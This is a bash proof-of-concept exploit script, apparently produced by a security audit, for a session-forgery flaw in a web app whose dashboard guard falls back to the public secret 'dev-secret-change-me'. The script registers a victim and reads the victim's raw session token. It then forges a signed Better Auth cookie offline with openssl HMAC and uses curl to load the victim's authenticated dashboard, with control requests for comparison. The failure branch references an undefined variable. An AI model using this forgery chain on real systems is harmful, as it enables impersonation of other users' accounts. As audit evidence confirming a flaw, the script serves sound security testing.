#!/usr/bin/env bash
# PoC for p10-007: dashboard.tsx requireAuth() falls back to the public constant
# 'dev-secret-change-me' when the BETTER_AUTH_SECRET binding is missing, so the
# /dashboard session guard verifies Better Auth session cookies against a key
# every attacker can read in the public repo.
#
# Chain (all requests hit the real production Worker under workerd):
#   0. Deployment has NO BETTER_AUTH_SECRET (setup.sh). /api/auth/* silently runs
#      on better-auth's own hardcoded default constant, so sign-up/sign-in still
#      work — the misconfiguration is fully silent.
#   1. Victim registers and signs in; their raw session token exists in D1 and
#      appears UNSIGNED wherever tokens are stored/logged.
#   2. Attacker, holding only (a) the leaked raw token and (b) the public repo,
#      computes offline: sig = base64(HMAC-SHA256(token, 'dev-secret-change-me'))
#      and forges Cookie: [REDACTED:cookie]
#   3. GET /dashboard with the forged cookie renders the VICTIM's authenticated
#      dashboard (victim email in SSR body) — full impersonation with zero
#      knowledge of any deployed secret.
#   Controls: no cookie -> login redirect; same forgery with a wrong constant ->
#      login redirect. Only the public constant unlocks the guard.
#
# Target: {{BASE_URL}} (filled at confirm time; defaults to local wrangler dev)
set -u
BASE="${1:-}"
case "$BASE" in ''|*'{{'*) BASE="http://127.0.0.1:8807";; esac
DEV_SECRET='dev-secret-change-me'
VICTIM="victim-poc-$(date +%s)@corp.test"

sign() { # sign <token> <secret> -> percent-encoded std-base64 HMAC (better-auth wire format)
  printf %s "$1" | openssl dgst -sha256 -hmac "$2" -binary \
    | openssl base64 -A | sed 's/+/%2B/g; s/\//%2F/g; s/=/%3D/g'
}
dash_hits() { curl -s -m 15 -H "Cookie: [REDACTED:cookie]
  | grep -o "$VICTIM\|/login" | sort | uniq -c; }
victim_rendered() { curl -s -m 15 -H "Cookie: [REDACTED:cookie]
  | grep -c "$VICTIM"; }

echo "[*] Step 1: victim registers via the real auth API (still functional: better-auth falls back to its own default constant)"
curl -s -m 15 -c /tmp/p10-007-victim.jar -o /dev/null -X POST "$BASE/api/auth/sign-up/email" \
  -H 'content-type: application/json' \
  -d "{\"name\":\"victim\",\"email\":\"$VICTIM\",\"password\":\"vicempw12345\"}"
VTOKEN=$(curl -s -m 15 -b /tmp/p10-007-victim.jar "$BASE/api/auth/get-session" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
[ -z "$VTOKEN" ] && { echo '{"status":"failed","evidence":"no raw session token obtainable","notes":"auth API not functional"}'; exit 1; }
echo "    victim raw session token (unsigned, as stored in D1 / server logs): $VTOKEN"

echo "[*] Step 2: attacker forges the victim's session cookie OFFLINE using only the public repo constant"
FORGED="$(sign "$VTOKEN" "$DEV_SECRET")"
echo "    forged cookie: [REDACTED:cookie]

echo "[*] Step 3: present forged cookie to the guarded dashboard"
echo "[*] Control A (no cookie):"; NOCOOKIE=$(curl -s -m 15 "$BASE/dashboard" | grep -c '/login')
echo "    '/login' redirect markers in body: $NOCOOKIE"
echo "[*] Control B (forgery keyed on wrong constant):"
WRONG="$(sign "$VTOKEN" 'wrong-secret-abc')"
WB=$(dash_hits "$VTOKEN.$WRONG")
echo "$WB" | sed 's/^/    /'
echo "[*] Exploit (forgery keyed on dev-secret-change-me):"
EB=$(dash_hits "$VTOKEN.$FORGED")
echo "$EB" | sed 's/^/    /'
VICTIM_HITS=$(victim_rendered "$VTOKEN.$FORGED")
CTRL_B_HITS=$(victim_rendered "$VTOKEN.$WRONG")

if [ "$VICTIM_HITS" -ge 1 ] && [ "$CTRL_B_HITS" -eq 0 ] && [ "$NOCOOKIE" -ge 1 ]; then
  echo '{"status":"confirmed","evidence":"GET /dashboard rendered victim-poc account as authenticated (victim email in SSR body) using a cookie whose signature was computed offline from only the public constant dev-secret-change-me + a leaked raw session token; controls: no-cookie and wrong-key forgeries both land on the /login redirect","notes":"dashboard.tsx:21 fallback makes the guard effective-secret a public constant; cross-user impersonation of the guarded dashboard surface"}'
else
  echo '{"status":"failed","evidence":"victim_hits='"$VICTIM_HITS"' exploit_logins='"$EXPLOIT_LOGINS"' nocookie_logins='"$NOCOOKIE"'","notes":""}'
fi
